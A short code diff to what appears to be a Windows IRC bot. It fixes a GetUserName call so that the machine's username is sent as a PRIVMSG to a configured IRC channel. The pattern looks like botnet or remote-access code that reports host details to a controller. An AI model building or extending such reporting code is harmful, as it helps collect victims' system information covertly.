@@ -88,8 +88,8 @@ void et_main_loop_win(SOCKET socket, char *nick)
 						ZeroMemory(info, 512);
 
 						char username[128];
-						int username_sz = 128;
-						GetUserName(info, &username_sz);
+						DWORD username_sz = 128;
+						GetUserName(username, &username_sz);
 						_snprintf(info, 512, "PRIVMSG %s :Username: %s\r\n", IRC_CHANNEL, username);
 						send(socket, info, strlen(info), 0);
 						ZeroMemory(info, 512);
